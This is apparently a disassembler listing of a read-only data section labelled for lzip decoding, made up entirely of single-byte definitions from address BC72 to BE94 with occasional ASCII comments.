.rodata.lzip_decode0:000000000000BC72                 db    0
.rodata.lzip_decode0:000000000000BC73                 db    0
.rodata.lzip_decode0:000000000000BC74                 db  13h
.rodata.lzip_decode0:000000000000BC75                 db    0
.rodata.lzip_decode0:000000000000BC76                 db    0
.rodata.lzip_decode0:000000000000BC77                 db    0
.rodata.lzip_decode0:000000000000BC78                 db    4
.rodata.lzip_decode0:000000000000BC79                 db    0
.rodata.lzip_decode0:000000000000BC7A                 db 0D0h
.rodata.lzip_decode0:000000000000BC7B                 db    0
.rodata.lzip_decode0:000000000000BC7C                 db  32h ; 2
.rodata.lzip_decode0:000000000000BC7D                 db    1
.rodata.lzip_decode0:000000000000BC7E                 db    0
.rodata.lzip_decode0:000000000000BC7F                 db    0
.rodata.lzip_decode0:000000000000BC80                 db  33h ; 3
.rodata.lzip_decode0:000000000000BC81                 db    0
.rodata.lzip_decode0:000000000000BC82                 db    0
.rodata.lzip_decode0:000000000000BC83                 db    0
.rodata.lzip_decode0:000000000000BC84                 db 0D3h
.rodata.lzip_decode0:000000000000BC85                 db    0
.rodata.lzip_decode0:000000000000BC86                 db    0
.rodata.lzip_decode0:000000000000BC87                 db    0
.rodata.lzip_decode0:000000000000BC88                 db 0C3h
.rodata.lzip_decode0:000000000000BC89                 db    0
.rodata.lzip_decode0:000000000000BC8A                 db    0
.rodata.lzip_decode0:000000000000BC8B                 db    0
.rodata.lzip_decode0:000000000000BC8C                 db  92h
.rodata.lzip_decode0:000000000000BC8D                 db    1
.rodata.lzip_decode0:000000000000BC8E                 db    0
.rodata.lzip_decode0:000000000000BC8F                 db    0
.rodata.lzip_decode0:000000000000BC90                 db  80h
.rodata.lzip_decode0:000000000000BC91                 db    5
.rodata.lzip_decode0:000000000000BC92                 db  18h
.rodata.lzip_decode0:000000000000BC93                 db    0
.rodata.lzip_decode0:000000000000BC94                 db  62h ; b
.rodata.lzip_decode0:000000000000BC95                 db    4
.rodata.lzip_decode0:000000000000BC96                 db    0
.rodata.lzip_decode0:000000000000BC97                 db    0
.rodata.lzip_decode0:000000000000BC98                 db  91h
.rodata.lzip_decode0:000000000000BC99                 db    4
.rodata.lzip_decode0:000000000000BC9A                 db    4
.rodata.lzip_decode0:000000000000BC9B                 db    0
.rodata.lzip_decode0:000000000000BC9C                 db    3
.rodata.lzip_decode0:000000000000BC9D                 db    0
.rodata.lzip_decode0:000000000000BC9E                 db    0
.rodata.lzip_decode0:000000000000BC9F                 db    0
.rodata.lzip_decode0:000000000000BCA0                 db    4
.rodata.lzip_decode0:000000000000BCA1                 db    0
.rodata.lzip_decode0:000000000000BCA2                 db  48h ; H
.rodata.lzip_decode0:000000000000BCA3                 db    9
.rodata.lzip_decode0:000000000000BCA4                 db  82h
.rodata.lzip_decode0:000000000000BCA5                 db    1
.rodata.lzip_decode0:000000000000BCA6                 db    0
.rodata.lzip_decode0:000000000000BCA7                 db    0
.rodata.lzip_decode0:000000000000BCA8                 db 0F3h
.rodata.lzip_decode0:000000000000BCA9                 db    1
.rodata.lzip_decode0:000000000000BCAA                 db    0
.rodata.lzip_decode0:000000000000BCAB                 db    0
.rodata.lzip_decode0:000000000000BCAC                 db  42h ; B
.rodata.lzip_decode0:000000000000BCAD                 db    2
.rodata.lzip_decode0:000000000000BCAE                 db    0
.rodata.lzip_decode0:000000000000BCAF                 db    0
.rodata.lzip_decode0:000000000000BCB0                 db  83h
.rodata.lzip_decode0:000000000000BCB1                 db    0
.rodata.lzip_decode0:000000000000BCB2                 db    0
.rodata.lzip_decode0:000000000000BCB3                 db    0
.rodata.lzip_decode0:000000000000BCB4                 db 0C3h
.rodata.lzip_decode0:000000000000BCB5                 db    1
.rodata.lzip_decode0:000000000000BCB6                 db    0
.rodata.lzip_decode0:000000000000BCB7                 db    0
.rodata.lzip_decode0:000000000000BCB8                 db 0C2h
.rodata.lzip_decode0:000000000000BCB9                 db    1
.rodata.lzip_decode0:000000000000BCBA                 db    0
.rodata.lzip_decode0:000000000000BCBB                 db    0
.rodata.lzip_decode0:000000000000BCBC                 db  33h ; 3
.rodata.lzip_decode0:000000000000BCBD                 db    2
.rodata.lzip_decode0:000000000000BCBE                 db    0
.rodata.lzip_decode0:000000000000BCBF                 db    0
.rodata.lzip_decode0:000000000000BCC0                 db  62h ; b
.rodata.lzip_decode0:000000000000BCC1                 db    2
.rodata.lzip_decode0:000000000000BCC2                 db    0
.rodata.lzip_decode0:000000000000BCC3                 db    0
.rodata.lzip_decode0:000000000000BCC4                 db 0B0h
.rodata.lzip_decode0:000000000000BCC5                 db    4
.rodata.lzip_decode0:000000000000BCC6                 db  68h ; h
.rodata.lzip_decode0:000000000000BCC7                 db    0
.rodata.lzip_decode0:000000000000BCC8                 db  70h ; p
.rodata.lzip_decode0:000000000000BCC9                 db    4
.rodata.lzip_decode0:000000000000BCCA                 db  24h ; $
.rodata.lzip_decode0:000000000000BCCB                 db    0
.rodata.lzip_decode0:000000000000BCCC                 db 0C2h
.rodata.lzip_decode0:000000000000BCCD                 db    3
.rodata.lzip_decode0:000000000000BCCE                 db    0
.rodata.lzip_decode0:000000000000BCCF                 db    0
.rodata.lzip_decode0:000000000000BCD0                 db  31h ; 1
.rodata.lzip_decode0:000000000000BCD1                 db    4
.rodata.lzip_decode0:000000000000BCD2                 db    8
.rodata.lzip_decode0:000000000000BCD3                 db    0
.rodata.lzip_decode0:000000000000BCD4                 db  13h
.rodata.lzip_decode0:000000000000BCD5                 db    2
.rodata.lzip_decode0:000000000000BCD6                 db    0
.rodata.lzip_decode0:000000000000BCD7                 db    0
.rodata.lzip_decode0:000000000000BCD8                 db  92h
.rodata.lzip_decode0:000000000000BCD9                 db    1
.rodata.lzip_decode0:000000000000BCDA                 db    0
.rodata.lzip_decode0:000000000000BCDB                 db    0
.rodata.lzip_decode0:000000000000BCDC                 db  33h ; 3
.rodata.lzip_decode0:000000000000BCDD                 db    0
.rodata.lzip_decode0:000000000000BCDE                 db    0
.rodata.lzip_decode0:000000000000BCDF                 db    0
.rodata.lzip_decode0:000000000000BCE0                 db  63h ; c
.rodata.lzip_decode0:000000000000BCE1                 db    1
.rodata.lzip_decode0:000000000000BCE2                 db    0
.rodata.lzip_decode0:000000000000BCE3                 db    0
.rodata.lzip_decode0:000000000000BCE4                 db    2
.rodata.lzip_decode0:000000000000BCE5                 db    1
.rodata.lzip_decode0:000000000000BCE6                 db    0
.rodata.lzip_decode0:000000000000BCE7                 db    0
.rodata.lzip_decode0:000000000000BCE8                 db    4
.rodata.lzip_decode0:000000000000BCE9                 db    0
.rodata.lzip_decode0:000000000000BCEA                 db  78h ; x
.rodata.lzip_decode0:000000000000BCEB                 db    0
.rodata.lzip_decode0:000000000000BCEC                 db  43h ; C
.rodata.lzip_decode0:000000000000BCED                 db    0
.rodata.lzip_decode0:000000000000BCEE                 db    0
.rodata.lzip_decode0:000000000000BCEF                 db    0
.rodata.lzip_decode0:000000000000BCF0                 db  42h ; B
.rodata.lzip_decode0:000000000000BCF1                 db    0
.rodata.lzip_decode0:000000000000BCF2                 db    0
.rodata.lzip_decode0:000000000000BCF3                 db    0
.rodata.lzip_decode0:000000000000BCF4                 db  82h
.rodata.lzip_decode0:000000000000BCF5                 db    1
.rodata.lzip_decode0:000000000000BCF6                 db    0
.rodata.lzip_decode0:000000000000BCF7                 db    0
.rodata.lzip_decode0:000000000000BCF8                 db  73h ; s
.rodata.lzip_decode0:000000000000BCF9                 db    0
.rodata.lzip_decode0:000000000000BCFA                 db    0
.rodata.lzip_decode0:000000000000BCFB                 db    0
.rodata.lzip_decode0:000000000000BCFC                 db  83h
.rodata.lzip_decode0:000000000000BCFD                 db    1
.rodata.lzip_decode0:000000000000BCFE                 db    0
.rodata.lzip_decode0:000000000000BCFF                 db    0
.rodata.lzip_decode0:000000000000BD00                 db  53h ; S
.rodata.lzip_decode0:000000000000BD01                 db    0
.rodata.lzip_decode0:000000000000BD02                 db    0
.rodata.lzip_decode0:000000000000BD03                 db    0
.rodata.lzip_decode0:000000000000BD04                 db  13h
.rodata.lzip_decode0:000000000000BD05                 db    0
.rodata.lzip_decode0:000000000000BD06                 db    0
.rodata.lzip_decode0:000000000000BD07                 db    0
.rodata.lzip_decode0:000000000000BD08                 db  22h ; "
.rodata.lzip_decode0:000000000000BD09                 db    0
.rodata.lzip_decode0:000000000000BD0A                 db    0
.rodata.lzip_decode0:000000000000BD0B                 db    0
.rodata.lzip_decode0:000000000000BD0C                 db    4
.rodata.lzip_decode0:000000000000BD0D                 db    0
.rodata.lzip_decode0:000000000000BD0E                 db  40h ; @
.rodata.lzip_decode0:000000000000BD0F                 db    0
.rodata.lzip_decode0:000000000000BD10                 db  82h
.rodata.lzip_decode0:000000000000BD11                 db    1
.rodata.lzip_decode0:000000000000BD12                 db    0
.rodata.lzip_decode0:000000000000BD13                 db    0
.rodata.lzip_decode0:000000000000BD14                 db 0B3h
.rodata.lzip_decode0:000000000000BD15                 db    0
.rodata.lzip_decode0:000000000000BD16                 db    0
.rodata.lzip_decode0:000000000000BD17                 db    0
.rodata.lzip_decode0:000000000000BD18                 db  12h
.rodata.lzip_decode0:000000000000BD19                 db    0
.rodata.lzip_decode0:000000000000BD1A                 db    0
.rodata.lzip_decode0:000000000000BD1B                 db    0
.rodata.lzip_decode0:000000000000BD1C                 db  83h
.rodata.lzip_decode0:000000000000BD1D                 db    1
.rodata.lzip_decode0:000000000000BD1E                 db    0
.rodata.lzip_decode0:000000000000BD1F                 db    0
.rodata.lzip_decode0:000000000000BD20                 db 0C2h
.rodata.lzip_decode0:000000000000BD21                 db    1
.rodata.lzip_decode0:000000000000BD22                 db    0
.rodata.lzip_decode0:000000000000BD23                 db    0
.rodata.lzip_decode0:000000000000BD24                 db  13h
.rodata.lzip_decode0:000000000000BD25                 db    0
.rodata.lzip_decode0:000000000000BD26                 db    0
.rodata.lzip_decode0:000000000000BD27                 db    0
.rodata.lzip_decode0:000000000000BD28                 db  82h
.rodata.lzip_decode0:000000000000BD29                 db    0
.rodata.lzip_decode0:000000000000BD2A                 db    0
.rodata.lzip_decode0:000000000000BD2B                 db    0
.rodata.lzip_decode0:000000000000BD2C                 db  63h ; c
.rodata.lzip_decode0:000000000000BD2D                 db    0
.rodata.lzip_decode0:000000000000BD2E                 db    0
.rodata.lzip_decode0:000000000000BD2F                 db    0
.rodata.lzip_decode0:000000000000BD30                 db  33h ; 3
.rodata.lzip_decode0:000000000000BD31                 db    2
.rodata.lzip_decode0:000000000000BD32                 db    0
.rodata.lzip_decode0:000000000000BD33                 db    0
.rodata.lzip_decode0:000000000000BD34                 db  62h ; b
.rodata.lzip_decode0:000000000000BD35                 db    2
.rodata.lzip_decode0:000000000000BD36                 db    0
.rodata.lzip_decode0:000000000000BD37                 db    0
.rodata.lzip_decode0:000000000000BD38                 db 0A3h
.rodata.lzip_decode0:000000000000BD39                 db    1
.rodata.lzip_decode0:000000000000BD3A                 db    0
.rodata.lzip_decode0:000000000000BD3B                 db    0
.rodata.lzip_decode0:000000000000BD3C                 db  32h ; 2
.rodata.lzip_decode0:000000000000BD3D                 db    1
.rodata.lzip_decode0:000000000000BD3E                 db    0
.rodata.lzip_decode0:000000000000BD3F                 db    0
.rodata.lzip_decode0:000000000000BD40                 db  23h ; #
.rodata.lzip_decode0:000000000000BD41                 db    2
.rodata.lzip_decode0:000000000000BD42                 db    0
.rodata.lzip_decode0:000000000000BD43                 db    0
.rodata.lzip_decode0:000000000000BD44                 db    4
.rodata.lzip_decode0:000000000000BD45                 db    0
.rodata.lzip_decode0:000000000000BD46                 db  50h ; P
.rodata.lzip_decode0:000000000000BD47                 db    0
.rodata.lzip_decode0:000000000000BD48                 db  22h ; "
.rodata.lzip_decode0:000000000000BD49                 db    1
.rodata.lzip_decode0:000000000000BD4A                 db    0
.rodata.lzip_decode0:000000000000BD4B                 db    0
.rodata.lzip_decode0:000000000000BD4C                 db 0A3h
.rodata.lzip_decode0:000000000000BD4D                 db    1
.rodata.lzip_decode0:000000000000BD4E                 db    0
.rodata.lzip_decode0:000000000000BD4F                 db    0
.rodata.lzip_decode0:000000000000BD50                 db  82h
.rodata.lzip_decode0:000000000000BD51                 db    0
.rodata.lzip_decode0:000000000000BD52                 db    0
.rodata.lzip_decode0:000000000000BD53                 db    0
.rodata.lzip_decode0:000000000000BD54                 db  13h
.rodata.lzip_decode0:000000000000BD55                 db    0
.rodata.lzip_decode0:000000000000BD56                 db    0
.rodata.lzip_decode0:000000000000BD57                 db    0
.rodata.lzip_decode0:000000000000BD58                 db 0C2h
.rodata.lzip_decode0:000000000000BD59                 db    1
.rodata.lzip_decode0:000000000000BD5A                 db    0
.rodata.lzip_decode0:000000000000BD5B                 db    0
.rodata.lzip_decode0:000000000000BD5C                 db  83h
.rodata.lzip_decode0:000000000000BD5D                 db    2
.rodata.lzip_decode0:000000000000BD5E                 db    0
.rodata.lzip_decode0:000000000000BD5F                 db    0
.rodata.lzip_decode0:000000000000BD60                 db  62h ; b
.rodata.lzip_decode0:000000000000BD61                 db    2
.rodata.lzip_decode0:000000000000BD62                 db    0
.rodata.lzip_decode0:000000000000BD63                 db    0
.rodata.lzip_decode0:000000000000BD64                 db  23h ; #
.rodata.lzip_decode0:000000000000BD65                 db    1
.rodata.lzip_decode0:000000000000BD66                 db    0
.rodata.lzip_decode0:000000000000BD67                 db    0
.rodata.lzip_decode0:000000000000BD68                 db  32h ; 2
.rodata.lzip_decode0:000000000000BD69                 db    0
.rodata.lzip_decode0:000000000000BD6A                 db    0
.rodata.lzip_decode0:000000000000BD6B                 db    0
.rodata.lzip_decode0:000000000000BD6C                 db 0D3h
.rodata.lzip_decode0:000000000000BD6D                 db    0
.rodata.lzip_decode0:000000000000BD6E                 db    0
.rodata.lzip_decode0:000000000000BD6F                 db    0
.rodata.lzip_decode0:000000000000BD70                 db  12h
.rodata.lzip_decode0:000000000000BD71                 db    1
.rodata.lzip_decode0:000000000000BD72                 db    0
.rodata.lzip_decode0:000000000000BD73                 db    0
.rodata.lzip_decode0:000000000000BD74                 db  53h ; S
.rodata.lzip_decode0:000000000000BD75                 db    0
.rodata.lzip_decode0:000000000000BD76                 db    0
.rodata.lzip_decode0:000000000000BD77                 db    0
.rodata.lzip_decode0:000000000000BD78                 db    4
.rodata.lzip_decode0:000000000000BD79                 db    0
.rodata.lzip_decode0:000000000000BD7A                 db 0A8h
.rodata.lzip_decode0:000000000000BD7B                 db    0
.rodata.lzip_decode0:000000000000BD7C                 db  63h ; c
.rodata.lzip_decode0:000000000000BD7D                 db    0
.rodata.lzip_decode0:000000000000BD7E                 db    0
.rodata.lzip_decode0:000000000000BD7F                 db    0
.rodata.lzip_decode0:000000000000BD80                 db  92h
.rodata.lzip_decode0:000000000000BD81                 db    1
.rodata.lzip_decode0:000000000000BD82                 db    0
.rodata.lzip_decode0:000000000000BD83                 db    0
.rodata.lzip_decode0:000000000000BD84                 db  33h ; 3
.rodata.lzip_decode0:000000000000BD85                 db    1
.rodata.lzip_decode0:000000000000BD86                 db    0
.rodata.lzip_decode0:000000000000BD87                 db    0
.rodata.lzip_decode0:000000000000BD88                 db  23h ; #
.rodata.lzip_decode0:000000000000BD89                 db    0
.rodata.lzip_decode0:000000000000BD8A                 db    0
.rodata.lzip_decode0:000000000000BD8B                 db    0
.rodata.lzip_decode0:000000000000BD8C                 db 0C2h
.rodata.lzip_decode0:000000000000BD8D                 db    0
.rodata.lzip_decode0:000000000000BD8E                 db    0
.rodata.lzip_decode0:000000000000BD8F                 db    0
.rodata.lzip_decode0:000000000000BD90                 db    2
.rodata.lzip_decode0:000000000000BD91                 db    1
.rodata.lzip_decode0:000000000000BD92                 db    0
.rodata.lzip_decode0:000000000000BD93                 db    0
.rodata.lzip_decode0:000000000000BD94                 db  43h ; C
.rodata.lzip_decode0:000000000000BD95                 db    2
.rodata.lzip_decode0:000000000000BD96                 db    0
.rodata.lzip_decode0:000000000000BD97                 db    0
.rodata.lzip_decode0:000000000000BD98                 db 0D2h
.rodata.lzip_decode0:000000000000BD99                 db    1
.rodata.lzip_decode0:000000000000BD9A                 db    0
.rodata.lzip_decode0:000000000000BD9B                 db    0
.rodata.lzip_decode0:000000000000BD9C                 db  32h ; 2
.rodata.lzip_decode0:000000000000BD9D                 db    0
.rodata.lzip_decode0:000000000000BD9E                 db    0
.rodata.lzip_decode0:000000000000BD9F                 db    0
.rodata.lzip_decode0:000000000000BDA0                 db  63h ; c
.rodata.lzip_decode0:000000000000BDA1                 db    2
.rodata.lzip_decode0:000000000000BDA2                 db    0
.rodata.lzip_decode0:000000000000BDA3                 db    0
.rodata.lzip_decode0:000000000000BDA4                 db    4
.rodata.lzip_decode0:000000000000BDA5                 db    0
.rodata.lzip_decode0:000000000000BDA6                 db  38h ; 8
.rodata.lzip_decode0:000000000000BDA7                 db    0
.rodata.lzip_decode0:000000000000BDA8                 db  42h ; B
.rodata.lzip_decode0:000000000000BDA9                 db    1
.rodata.lzip_decode0:000000000000BDAA                 db    0
.rodata.lzip_decode0:000000000000BDAB                 db    0
.rodata.lzip_decode0:000000000000BDAC                 db  32h ; 2
.rodata.lzip_decode0:000000000000BDAD                 db    0
.rodata.lzip_decode0:000000000000BDAE                 db    0
.rodata.lzip_decode0:000000000000BDAF                 db    0
.rodata.lzip_decode0:000000000000BDB0                 db  62h ; b
.rodata.lzip_decode0:000000000000BDB1                 db    0
.rodata.lzip_decode0:000000000000BDB2                 db    0
.rodata.lzip_decode0:000000000000BDB3                 db    0
.rodata.lzip_decode0:000000000000BDB4                 db 0A3h
.rodata.lzip_decode0:000000000000BDB5                 db    0
.rodata.lzip_decode0:000000000000BDB6                 db    0
.rodata.lzip_decode0:000000000000BDB7                 db    0
.rodata.lzip_decode0:000000000000BDB8                 db 0E3h
.rodata.lzip_decode0:000000000000BDB9                 db    1
.rodata.lzip_decode0:000000000000BDBA                 db    0
.rodata.lzip_decode0:000000000000BDBB                 db    0
.rodata.lzip_decode0:000000000000BDBC                 db  82h
.rodata.lzip_decode0:000000000000BDBD                 db    0
.rodata.lzip_decode0:000000000000BDBE                 db    0
.rodata.lzip_decode0:000000000000BDBF                 db    0
.rodata.lzip_decode0:000000000000BDC0                 db  13h
.rodata.lzip_decode0:000000000000BDC1                 db    0
.rodata.lzip_decode0:000000000000BDC2                 db    0
.rodata.lzip_decode0:000000000000BDC3                 db    0
.rodata.lzip_decode0:000000000000BDC4                 db 0C2h
.rodata.lzip_decode0:000000000000BDC5                 db    1
.rodata.lzip_decode0:000000000000BDC6                 db    0
.rodata.lzip_decode0:000000000000BDC7                 db    0
.rodata.lzip_decode0:000000000000BDC8                 db  63h ; c
.rodata.lzip_decode0:000000000000BDC9                 db    0
.rodata.lzip_decode0:000000000000BDCA                 db    0
.rodata.lzip_decode0:000000000000BDCB                 db    0
.rodata.lzip_decode0:000000000000BDCC                 db  83h
.rodata.lzip_decode0:000000000000BDCD                 db    0
.rodata.lzip_decode0:000000000000BDCE                 db    0
.rodata.lzip_decode0:000000000000BDCF                 db    0
.rodata.lzip_decode0:000000000000BDD0                 db  42h ; B
.rodata.lzip_decode0:000000000000BDD1                 db    0
.rodata.lzip_decode0:000000000000BDD2                 db    0
.rodata.lzip_decode0:000000000000BDD3                 db    0
.rodata.lzip_decode0:000000000000BDD4                 db    4
.rodata.lzip_decode0:000000000000BDD5                 db    0
.rodata.lzip_decode0:000000000000BDD6                 db 0A0h
.rodata.lzip_decode0:000000000000BDD7                 db    0
.rodata.lzip_decode0:000000000000BDD8                 db  12h
.rodata.lzip_decode0:000000000000BDD9                 db    0
.rodata.lzip_decode0:000000000000BDDA                 db    0
.rodata.lzip_decode0:000000000000BDDB                 db    0
.rodata.lzip_decode0:000000000000BDDC                 db 0C2h
.rodata.lzip_decode0:000000000000BDDD                 db    0
.rodata.lzip_decode0:000000000000BDDE                 db    0
.rodata.lzip_decode0:000000000000BDDF                 db    0
.rodata.lzip_decode0:000000000000BDE0                 db  52h ; R
.rodata.lzip_decode0:000000000000BDE1                 db    0
.rodata.lzip_decode0:000000000000BDE2                 db    0
.rodata.lzip_decode0:000000000000BDE3                 db    0
.rodata.lzip_decode0:000000000000BDE4                 db  83h
.rodata.lzip_decode0:000000000000BDE5                 db    1
.rodata.lzip_decode0:000000000000BDE6                 db    0
.rodata.lzip_decode0:000000000000BDE7                 db    0
.rodata.lzip_decode0:000000000000BDE8                 db 0C2h
.rodata.lzip_decode0:000000000000BDE9                 db    1
.rodata.lzip_decode0:000000000000BDEA                 db    0
.rodata.lzip_decode0:000000000000BDEB                 db    0
.rodata.lzip_decode0:000000000000BDEC                 db  33h ; 3
.rodata.lzip_decode0:000000000000BDED                 db    0
.rodata.lzip_decode0:000000000000BDEE                 db    0
.rodata.lzip_decode0:000000000000BDEF                 db    0
.rodata.lzip_decode0:000000000000BDF0                 db 0C3h
.rodata.lzip_decode0:000000000000BDF1                 db    1
.rodata.lzip_decode0:000000000000BDF2                 db    0
.rodata.lzip_decode0:000000000000BDF3                 db    0
.rodata.lzip_decode0:000000000000BDF4                 db  62h ; b
.rodata.lzip_decode0:000000000000BDF5                 db    1
.rodata.lzip_decode0:000000000000BDF6                 db    0
.rodata.lzip_decode0:000000000000BDF7                 db    0
.rodata.lzip_decode0:000000000000BDF8                 db  53h ; S
.rodata.lzip_decode0:000000000000BDF9                 db    0
.rodata.lzip_decode0:000000000000BDFA                 db    0
.rodata.lzip_decode0:000000000000BDFB                 db    0
.rodata.lzip_decode0:000000000000BDFC                 db 0C2h
.rodata.lzip_decode0:000000000000BDFD                 db    4
.rodata.lzip_decode0:000000000000BDFE                 db    0
.rodata.lzip_decode0:000000000000BDFF                 db    0
.rodata.lzip_decode0:000000000000BE00                 db 0A3h
.rodata.lzip_decode0:000000000000BE01                 db    4
.rodata.lzip_decode0:000000000000BE02                 db    0
.rodata.lzip_decode0:000000000000BE03                 db    0
.rodata.lzip_decode0:000000000000BE04                 db    4
.rodata.lzip_decode0:000000000000BE05                 db    0
.rodata.lzip_decode0:000000000000BE06                 db  48h ; H
.rodata.lzip_decode0:000000000000BE07                 db    0
.rodata.lzip_decode0:000000000000BE08                 db  53h ; S
.rodata.lzip_decode0:000000000000BE09                 db    0
.rodata.lzip_decode0:000000000000BE0A                 db    0
.rodata.lzip_decode0:000000000000BE0B                 db    0
.rodata.lzip_decode0:000000000000BE0C                 db 0A2h
.rodata.lzip_decode0:000000000000BE0D                 db    0
.rodata.lzip_decode0:000000000000BE0E                 db    0
.rodata.lzip_decode0:000000000000BE0F                 db    0
.rodata.lzip_decode0:000000000000BE10                 db  92h
.rodata.lzip_decode0:000000000000BE11                 db    0
.rodata.lzip_decode0:000000000000BE12                 db    0
.rodata.lzip_decode0:000000000000BE13                 db    0
.rodata.lzip_decode0:000000000000BE14                 db  33h ; 3
.rodata.lzip_decode0:000000000000BE15                 db    0
.rodata.lzip_decode0:000000000000BE16                 db    0
.rodata.lzip_decode0:000000000000BE17                 db    0
.rodata.lzip_decode0:000000000000BE18                 db    2
.rodata.lzip_decode0:000000000000BE19                 db    1
.rodata.lzip_decode0:000000000000BE1A                 db    0
.rodata.lzip_decode0:000000000000BE1B                 db    0
.rodata.lzip_decode0:000000000000BE1C                 db 0C3h
.rodata.lzip_decode0:000000000000BE1D                 db    0
.rodata.lzip_decode0:000000000000BE1E                 db    0
.rodata.lzip_decode0:000000000000BE1F                 db    0
.rodata.lzip_decode0:000000000000BE20                 db  33h ; 3
.rodata.lzip_decode0:000000000000BE21                 db    1
.rodata.lzip_decode0:000000000000BE22                 db    0
.rodata.lzip_decode0:000000000000BE23                 db    0
.rodata.lzip_decode0:000000000000BE24                 db  32h ; 2
.rodata.lzip_decode0:000000000000BE25                 db    1
.rodata.lzip_decode0:000000000000BE26                 db    0
.rodata.lzip_decode0:000000000000BE27                 db    0
.rodata.lzip_decode0:000000000000BE28                 db  32h ; 2
.rodata.lzip_decode0:000000000000BE29                 db    0
.rodata.lzip_decode0:000000000000BE2A                 db    0
.rodata.lzip_decode0:000000000000BE2B                 db    0
.rodata.lzip_decode0:000000000000BE2C                 db  83h
.rodata.lzip_decode0:000000000000BE2D                 db    0
.rodata.lzip_decode0:000000000000BE2E                 db    0
.rodata.lzip_decode0:000000000000BE2F                 db    0
.rodata.lzip_decode0:000000000000BE30                 db  42h ; B
.rodata.lzip_decode0:000000000000BE31                 db    0
.rodata.lzip_decode0:000000000000BE32                 db    0
.rodata.lzip_decode0:000000000000BE33                 db    0
.rodata.lzip_decode0:000000000000BE34                 db  33h ; 3
.rodata.lzip_decode0:000000000000BE35                 db    1
.rodata.lzip_decode0:000000000000BE36                 db    0
.rodata.lzip_decode0:000000000000BE37                 db    0
.rodata.lzip_decode0:000000000000BE38                 db  32h ; 2
.rodata.lzip_decode0:000000000000BE39                 db    1
.rodata.lzip_decode0:000000000000BE3A                 db    0
.rodata.lzip_decode0:000000000000BE3B                 db    0
.rodata.lzip_decode0:000000000000BE3C                 db 0D3h
.rodata.lzip_decode0:000000000000BE3D                 db    0
.rodata.lzip_decode0:000000000000BE3E                 db    0
.rodata.lzip_decode0:000000000000BE3F                 db    0
.rodata.lzip_decode0:000000000000BE40                 db  63h ; c
.rodata.lzip_decode0:000000000000BE41                 db    1
.rodata.lzip_decode0:000000000000BE42                 db    0
.rodata.lzip_decode0:000000000000BE43                 db    0
.rodata.lzip_decode0:000000000000BE44                 db 0B2h
.rodata.lzip_decode0:000000000000BE45                 db    0
.rodata.lzip_decode0:000000000000BE46                 db    0
.rodata.lzip_decode0:000000000000BE47                 db    0
.rodata.lzip_decode0:000000000000BE48                 db  93h
.rodata.lzip_decode0:000000000000BE49                 db    0
.rodata.lzip_decode0:000000000000BE4A                 db    0
.rodata.lzip_decode0:000000000000BE4B                 db    0
.rodata.lzip_decode0:000000000000BE4C                 db  13h
.rodata.lzip_decode0:000000000000BE4D                 db    0
.rodata.lzip_decode0:000000000000BE4E                 db    0
.rodata.lzip_decode0:000000000000BE4F                 db    0
.rodata.lzip_decode0:000000000000BE50                 db    4
.rodata.lzip_decode0:000000000000BE51                 db    0
.rodata.lzip_decode0:000000000000BE52                 db  70h ; p
.rodata.lzip_decode0:000000000000BE53                 db    0
.rodata.lzip_decode0:000000000000BE54                 db  52h ; R
.rodata.lzip_decode0:000000000000BE55                 db    3
.rodata.lzip_decode0:000000000000BE56                 db    0
.rodata.lzip_decode0:000000000000BE57                 db    0
.rodata.lzip_decode0:000000000000BE58                 db 0E3h
.rodata.lzip_decode0:000000000000BE59                 db    1
.rodata.lzip_decode0:000000000000BE5A                 db    0
.rodata.lzip_decode0:000000000000BE5B                 db    0
.rodata.lzip_decode0:000000000000BE5C                 db  33h ; 3
.rodata.lzip_decode0:000000000000BE5D                 db    0
.rodata.lzip_decode0:000000000000BE5E                 db    0
.rodata.lzip_decode0:000000000000BE5F                 db    0
.rodata.lzip_decode0:000000000000BE60                 db  32h ; 2
.rodata.lzip_decode0:000000000000BE61                 db    0
.rodata.lzip_decode0:000000000000BE62                 db    0
.rodata.lzip_decode0:000000000000BE63                 db    0
.rodata.lzip_decode0:000000000000BE64                 db  73h ; s
.rodata.lzip_decode0:000000000000BE65                 db    0
.rodata.lzip_decode0:000000000000BE66                 db    0
.rodata.lzip_decode0:000000000000BE67                 db    0
.rodata.lzip_decode0:000000000000BE68                 db  13h
.rodata.lzip_decode0:000000000000BE69                 db    0
.rodata.lzip_decode0:000000000000BE6A                 db    0
.rodata.lzip_decode0:000000000000BE6B                 db    0
.rodata.lzip_decode0:000000000000BE6C                 db 0B3h
.rodata.lzip_decode0:000000000000BE6D                 db    1
.rodata.lzip_decode0:000000000000BE6E                 db    0
.rodata.lzip_decode0:000000000000BE6F                 db    0
.rodata.lzip_decode0:000000000000BE70                 db    4
.rodata.lzip_decode0:000000000000BE71                 db    0
.rodata.lzip_decode0:000000000000BE72                 db  58h ; X
.rodata.lzip_decode0:000000000000BE73                 db    0
.rodata.lzip_decode0:000000000000BE74                 db  52h ; R
.rodata.lzip_decode0:000000000000BE75                 db    3
.rodata.lzip_decode0:000000000000BE76                 db    0
.rodata.lzip_decode0:000000000000BE77                 db    0
.rodata.lzip_decode0:000000000000BE78                 db 0E3h
.rodata.lzip_decode0:000000000000BE79                 db    1
.rodata.lzip_decode0:000000000000BE7A                 db    0
.rodata.lzip_decode0:000000000000BE7B                 db    0
.rodata.lzip_decode0:000000000000BE7C                 db  33h ; 3
.rodata.lzip_decode0:000000000000BE7D                 db    0
.rodata.lzip_decode0:000000000000BE7E                 db    0
.rodata.lzip_decode0:000000000000BE7F                 db    0
.rodata.lzip_decode0:000000000000BE80                 db  32h ; 2
.rodata.lzip_decode0:000000000000BE81                 db    0
.rodata.lzip_decode0:000000000000BE82                 db    0
.rodata.lzip_decode0:000000000000BE83                 db    0
.rodata.lzip_decode0:000000000000BE84                 db  33h ; 3
.rodata.lzip_decode0:000000000000BE85                 db    0
.rodata.lzip_decode0:000000000000BE86                 db    0
.rodata.lzip_decode0:000000000000BE87                 db    0
.rodata.lzip_decode0:000000000000BE88                 db  43h ; C
.rodata.lzip_decode0:000000000000BE89                 db    1
.rodata.lzip_decode0:000000000000BE8A                 db    0
.rodata.lzip_decode0:000000000000BE8B                 db    0
.rodata.lzip_decode0:000000000000BE8C                 db  82h
.rodata.lzip_decode0:000000000000BE8D                 db    0
.rodata.lzip_decode0:000000000000BE8E                 db    0
.rodata.lzip_decode0:000000000000BE8F                 db    0
.rodata.lzip_decode0:000000000000BE90                 db    4
.rodata.lzip_decode0:000000000000BE91                 db    0
.rodata.lzip_decode0:000000000000BE92                 db  60h ; `
.rodata.lzip_decode0:000000000000BE93                 db    0
.rodata.lzip_decode0:000000000000BE94                 db  32h ; 2
